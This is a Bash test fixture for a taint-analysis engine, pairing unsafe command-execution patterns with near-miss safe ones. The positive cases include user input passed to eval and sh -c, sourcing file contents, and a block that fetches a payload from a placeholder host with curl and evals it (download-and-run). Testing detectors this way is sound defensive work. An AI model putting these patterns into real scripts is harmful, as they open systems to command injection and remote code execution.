#!/usr/bin/env bash
# Positive fixture for the Bash taint engine. Each block flows an untrusted
# shell source (positional/special parameter, `read` stdin, or a `$(curl/cat)`
# substitution) into a command-execution sink. The NEAR MISS blocks at the
# bottom must NOT fire.

# POSITIVE: positional parameter -> eval.
eval "$1"

# POSITIVE: special parameter $@ -> bash -c.
bash -c "$@"

# POSITIVE: read stdin -> sh -c.
read userinput
sh -c "$userinput"

# POSITIVE: $(curl ...) -> eval (download-and-run).
remote=$(curl -s http://example.com/payload)
eval "$remote"

# POSITIVE: $(cat ...) -> source (file content executed).
contents=$(cat /tmp/userfile)
source "$contents"

# POSITIVE inside a function: positional parameter -> eval.
run_it() {
  eval "$1"
}

# NEAR MISS: literal argument, no expansion.
eval "ls -la"

# NEAR MISS: clean literal assignment reaching the sink.
safe_cmd="ls"
eval "$safe_cmd"

# NEAR MISS: printf %q shell-quotes the parameter before it reaches eval.
quoted=$(printf '%q' "$1")
eval "$quoted"
